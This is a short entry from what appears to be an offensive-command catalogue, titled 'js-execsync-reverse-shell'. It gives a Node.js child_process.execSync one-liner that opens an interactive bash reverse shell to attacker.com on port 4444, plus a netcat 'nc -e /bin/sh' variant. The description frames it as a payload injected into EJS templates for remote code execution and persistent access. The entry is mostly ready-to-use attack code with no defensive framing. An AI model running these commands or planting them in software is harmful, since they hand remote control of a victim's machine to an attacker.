---
data: >-
  require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444
  0>&1")
tags:
  - reverse-shell
  - persistence
type: command
output: null
executor: javascript
platforms:
  - Node.js
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.739Z'
id: c94065da-c37a-4473-b195-aa77f3310b87
verified: false
validated: true
submitted: true
---
# js-execsync-reverse-shell

## Command

```javascript
require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
```

## Description

Injects a reverse shell payload into EJS to spawn an interactive bash shell connecting back to the attacker's listener on port 4444, achieving persistent access via RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "bash -i >& /dev/tcp/attacker.com/4444 0>&1" | Reverse shell command | Yes |

## Examples

### Basic Usage

```javascript
require("child_process").execSync("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
```

### Advanced Usage

```javascript
require("child_process").execSync("nc -e /bin/sh attacker.com 4444")
```

## Expected Output

Interactive shell connected to attacker; commands executable remotely.

## Related

- [[Related Procedure: Launch-and-Exploit-Fastify-Server-for-RCE]]
